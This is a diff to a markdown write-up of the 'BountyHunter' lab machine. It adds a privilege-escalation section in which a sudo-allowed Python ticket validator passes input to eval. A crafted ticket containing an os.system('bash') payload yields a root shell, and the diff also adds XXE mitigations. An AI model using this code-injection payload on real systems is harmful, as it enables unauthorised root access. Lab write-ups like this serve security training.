@@ -1,21 +1,9 @@
 
 # BountyHunter
 
-- Hints
 - Walkthrough
 - Mitigrations
 - References
-
-## Hints
-
-# User
-
-1. Find the right wordlist.
-
-# Root
-
-3. Expand and look deeper.
-
 
 ## BountyHunter
 
@@ -247,21 +235,7 @@ The tester used this password with the development user, found in the passwd fil
 development@10.10.11.100's password: 
 Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
 
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Mon 13 Nov 2023 04:44:49 PM UTC
-
-  System load:           0.0
-  Usage of /:            24.2% of 6.83GB
-  Memory usage:          14%
-  Swap usage:            0%
-  Processes:             213
-  Users logged in:       0
-  IPv4 address for eth0: 10.10.11.100
-  IPv6 address for eth0: dead:beef::250:56ff:feb9:d62f
-
+<snip>
 
 0 updates can be applied immediately.
 
@@ -279,7 +253,76 @@ bountyhunter
 development@bountyhunter:~$ 
 ```
 
+The development account is able to run the ticketValidator as root.
+
+```
+development@bountyhunter:/opt/skytrain_inc$ sudo -l
+Matching Defaults entries for development on bountyhunter:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User development may run the following commands on bountyhunter:
+    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+development@bountyhunter:/opt/skytrain_inc$ 
+
+```
+
+The Tester investigated the code and found user input gets passed into the "eval" function. This function evaluates python statments therefore can be used to execute commands. The first 32 lines of code deals with the layout of the ticket, ensuring the ticket is in the right format. This can be bypassed by copying the first 3 lines of the invalid ticket from the "invalid_tickets" folder. These lines are:
+
+```
+# Skytrain Inc
+## Ticket to Bridgeport
+__Ticket Code:__
+```
+
+The 33th line of code is what needs to be looked at, it requires the remainder of the sum of the ticket code to be 4. The Tester used the payload:
+
+```
+**18+__import__('os').system('bash')**
+```
+
+The asterisk sysmbols are removed by the script. Next is the  18. This, after using the modulo operator against 7 will have a remainder of 4, with will clear the scripts check on line 33. The rest of the payload simply imports the "os" module and calling the function system to execute the bash command. This will spawn a root shell as the script is running.
+
+
+```The ticket that will spawn a bash shell.
+# Skytrain Inc
+## Ticket to Bridgeport
+__Ticket Code:__
+**18+__import__('os').system('bash')**
+##Issued: 2021/06/21
+#End Ticket
+```
+
+The Tester ran the script and entered the ticket location and gained a root shell.
+
+```
+development@bountyhunter:/opt/skytrain_inc$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
+Please enter the path to the ticket file.
+/tmp/special_ticket.md
+Destination: Bridgeport
+root@bountyhunter:/opt/skytrain_inc# id
+uid=0(root) gid=0(root) groups=0(root)
+root@bountyhunter:/opt/skytrain_inc# hostname
+bountyhunter
+root@bountyhunter:/opt/skytrain_inc# 
+```
+
+
 
 ## Mitigations 
 
+- Avoid outdated functions and libraries
+- Disable referencing custom Document Type Definitions (DTDs)
+- Disable referencing External XML Entities
+- Disable Parameter Entity processing
+- Disable support for XInclude
+- Prevent Entity Reference Loops
+- Disable displaying errors
+
+
 ## References
+
+https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
+
+
+
+
